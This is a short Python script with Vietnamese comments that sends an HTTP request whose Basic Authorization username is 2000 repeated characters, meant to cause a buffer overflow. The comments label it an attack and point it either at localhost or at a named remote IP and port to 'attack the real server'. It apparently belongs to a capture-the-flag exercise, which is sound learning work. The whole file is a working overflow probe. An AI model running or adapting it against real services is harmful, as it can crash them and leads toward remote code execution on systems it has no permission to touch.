import socket
import base64

# Thay đổi IP và Port ở đây
# Dùng 127.0.0.1:1337 để debug trên máy local
# Dùng 94.237.121.185:41395 để tấn công server thật
HOST = "127.0.0.1"
PORT = 1337

# PAYLOAD GÂY TRÀN BỘ ĐỆM - ĐẶT VÀO USERNAME
# Chúng ta sẽ tìm offset chính xác sau, giờ cứ thử một số lớn
overflow_username = "A" * 2000
normal_password = "password"

# 1. Tạo chuỗi "username:password"
auth_string = f"{overflow_username}:{normal_password}"

# 2. Mã hóa Base64
encoded_auth = base64.b64encode(auth_string.encode()).decode()

# 3. Tạo request HTTP hoàn chỉnh
request = (
    f"GET / HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    f"Authorization: Basic {encoded_auth}\r\n"
    f"User-Agent: python-exploit\r\n"
    f"Accept: */*\r\n\r\n"
)

# 4. Gửi request
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print("[+] Connected.")
    
    print("[+] Sending malicious HTTP request...")
    s.send(request.encode())
    
    response = s.recv(4096)
    print(f"[-] Server response: {response.decode()}")

except Exception as e:
    print(f"[!] An error occurred or connection was closed: {e}")
finally:
    s.close()